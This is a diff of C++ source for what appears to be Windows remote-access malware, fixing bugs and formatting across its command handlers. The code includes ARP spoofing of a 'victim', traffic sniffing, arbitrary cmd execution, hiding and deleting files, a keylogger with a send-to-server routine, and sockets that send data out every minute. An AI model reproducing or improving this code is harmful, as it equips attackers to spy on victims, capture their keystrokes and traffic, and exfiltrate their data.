@@ -1,4 +1,4 @@
-#define _CRT_SECURE_NO_WARNINGS
+ï»¿#define _CRT_SECURE_NO_WARNINGS
 #include "Components.h"
 #include "arpspoof.h"
 #include "SniffTraffic.h"
@@ -43,7 +43,7 @@ vector<string> split(string str)
 }
 
 /*
-	EXECUTE the netstat command
+EXECUTE the netstat command
 */
 string RunNetstat(string cmd)
 {
@@ -51,14 +51,19 @@ string RunNetstat(string cmd)
 }
 
 /*
-	get the names,type and permissions of files in a directory
+get the names,type and permissions of files in a directory
 */
-string GetAllFiles(string dir = "c:\\")
+string GetAllFiles(string dir)
 {
+	if (dir.empty())
+	{
+		char path[128];
+		GetCurrentDirectory(sizeof(path), path);
+		dir = path;
+	}
 	string result = "";
 	// Get recursive list of files in given directory and its sub directories
-	vector<MyFileClass> listOfFiles;
-	getAllFilesInDir(dir, listOfFiles);
+	vector<MyFileClass> listOfFiles = getAllFilesInDir(dir);
 
 	for (vector<MyFileClass>::iterator it = listOfFiles.begin(); it != listOfFiles.end(); ++it)
 	{
@@ -74,7 +79,7 @@ string GetAllFiles(string dir = "c:\\")
 }
 
 /*
-	call function to open a socket in a different  thread
+call function to open a socket in a different  thread
 */
 string OpenSocket(std::string ip_and_port)
 {
@@ -85,13 +90,13 @@ string OpenSocket(std::string ip_and_port)
 	}
 }
 /*
-	start thread to spoof victim
+start thread to spoof victim
 */
 string SpoofVictim(std::string ip)
 {
-		thread t(&SpoofVictimInThread, ip);
-		t.detach();
-		return "Spoof started";
+	thread t(&SpoofVictimInThread, ip);
+	t.detach();
+	return "Spoof started";
 }
 
 string SniffCurrentTraffic(std::string filter)
@@ -108,9 +113,9 @@ string StopSniffTraffic(string nothing)
 }
 
 /*
-	start spoofing a victim ip. 
-	create a spoofing object and add it to the spoofvictims vector
-	start spoofing in new thread
+start spoofing a victim ip.
+create a spoofing object and add it to the spoofvictims vector
+start spoofing in new thread
 */
 void SpoofVictimInThread(std::string ip)
 {
@@ -221,27 +226,29 @@ string ChangeFile(string cmd)
 {
 	vector<string> res = split(cmd);
 	vector<string>::iterator it = res.begin();
+	string file = *it;
+	MessageBox(NULL, "sd", file.c_str(), 0);
 	string typeofcommand = (*++it);
-	if (typeofcommand.compare("+h"))
+	if (!typeofcommand.compare("+h"))
 	{
-		return HideFileOrFolder(string((*it)));
+		return HideFileOrFolder(file);
 	}
-	if (typeofcommand.compare("-h"))
+	if (!typeofcommand.compare("-h"))
 	{
-		return UnHideFileOrFolder(string((*it)));
+		return UnHideFileOrFolder(file);
 	}
-	if (typeofcommand.compare("rm"))
+	if (!typeofcommand.compare("rm"))
 	{
-		return DeleteGivenFile(string((*it)));
+		return DeleteGivenFile(file);
 	}
-	if (typeofcommand.compare("move"))
+	if (!typeofcommand.compare("mv"))
 	{
 		return MoveGivenFileToDestination(string((*++it)), string((*it)));
 	}
 }
 
 /*
-	returns arp table. interface, each ip and mac
+returns arp table. interface, each ip and mac
 */
 string GetArpTable()
 {
@@ -294,7 +301,7 @@ string StopKeyLogger(string nothing)
 
 string HideMessageInPicture(string fileName_and_cmd)
 {
- 	vector<string> params = split(fileName_and_cmd);
+	vector<string> params = split(fileName_and_cmd);
 	vector<string>::iterator it = params.begin();
 	string fileName = *it;
 	string cmd = *(++it);
@@ -308,7 +315,7 @@ string HideMessageInPicture(string fileName_and_cmd)
 
 
 /*
-	change attribute to hidden in file or folder
+change attribute to hidden in file or folder
 */
 string HideFileOrFolder(string pathtofileorfolder)
 {
@@ -318,7 +325,7 @@ string HideFileOrFolder(string pathtofileorfolder)
 }
 
 /*
-	turn hidden file to not hidden
+turn hidden file to not hidden
 */
 string UnHideFileOrFolder(string pathtofileorfolder)
 {
@@ -328,7 +335,7 @@ string UnHideFileOrFolder(string pathtofileorfolder)
 }
 
 /*
-	delete file
+delete file
 */
 string DeleteGivenFile(string pathtodelete)
 {
@@ -338,7 +345,7 @@ string DeleteGivenFile(string pathtodelete)
 }
 
 /*
-	move filepath to other directory path
+move filepath to other directory path
 */
 string MoveGivenFileToDestination(string pathtofile, string Destination)
 {
@@ -348,7 +355,7 @@ string MoveGivenFileToDestination(string pathtofile, string Destination)
 }
 
 /*
-	 open a socket in a different  thread and send data every minute
+open a socket in a different  thread and send data every minute
 */
 string OpenSocketWithThread(std::string ip_and_port)
 {
@@ -404,10 +411,10 @@ std::string SniffTrafficWithThread(std::string filter)
 }
 
 /*
-	execute in cmd a command
-	Input: command
-	Output: stdout with returns from commands
-	*/
+execute in cmd a command
+Input: command
+Output: stdout with returns from commands
+*/
 string exec(string cmd)
 {
 	char buffer[128];
@@ -433,7 +440,7 @@ string exec(string cmd)
 }
 
 /*
-	get permissions for each permissions in file
+get permissions for each permissions in file
 */
 string getFilePermissions(perms p)
 {
@@ -451,11 +458,12 @@ string getFilePermissions(perms p)
 }
 
 /*
-	the function gets the names and permissions of a file in a dir
-	checks if the path exists then iterates through the dir and gets all permissions
-	*/
-void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles)
+the function gets the names and permissions of a file in a dir
+checks if the path exists then iterates through the dir and gets all permissions
+*/
+vector<MyFileClass> getAllFilesInDir(const string &dirPath)
 {
+	vector<MyFileClass> listOfFiles;
 	// Create a vector of string
 	try {
 		// Check if given path exists and points to a directory
@@ -484,15 +492,16 @@ void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles)
 	{
 		cerr << "Exception :: " << e.what();
 	}
-	//return listOfFiles;
+	return listOfFiles;
 }
 
 /*
-	the func opens a socket from a given port to a ip and port
+the func opens a socket from a given port to a ip and port
 */
 bool ConnectToHost(const char * PortNo, const char * IPAddress, SOCKET* s)
 {
-	//Start up Winsock…
+	//Start up Winsock
+
 	WSADATA wsadata;
 
 	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);
@@ -508,7 +517,8 @@ bool ConnectToHost(const char * PortNo, const char * IPAddress, SOCKET* s)
 		return false;
 	}
 
-	//Fill out the information needed to initialize a socket…
+	//Fill out the information needed to initialize a socket
+
 	addrinfo hints;
 	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
@@ -536,7 +546,7 @@ bool ConnectToHost(const char * PortNo, const char * IPAddress, SOCKET* s)
 }
 
 /*
-	close socket
+close socket
 */
 void CloseConnection(SOCKET s)
 {
@@ -559,7 +569,7 @@ bool SpecialKeys(int S_Key) {
 		//LOG("\n");
 		kl.append("\n");
 		return true;
-	case '¾':
+	case 'Â¾':
 		cout << ".";
 		//LOG(".");
 		kl.append(".");
@@ -605,7 +615,8 @@ void SendPicture(string fileName, string cmd)
 		return;
 	}
 
-	//Fill out the information needed to initialize a socket…
+	//Fill out the information needed to initialize a socket
+
 	addrinfo hints;
 	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
@@ -618,7 +629,6 @@ void SendPicture(string fileName, string cmd)
 		return; //Couldn't create the socket
 	}
 
-	//Try connecting...
 	addrinfo *target;
 	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
 	connect(s, target->ai_addr, (int)target->ai_addrlen);
@@ -759,7 +769,8 @@ void SendKeyLoggerToServer(string sharedKey)
 		return;
 	}
 
-	//Fill out the information needed to initialize a socket…
+	//Fill out the information needed to initialize a socket
+
 	addrinfo hints;
 	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
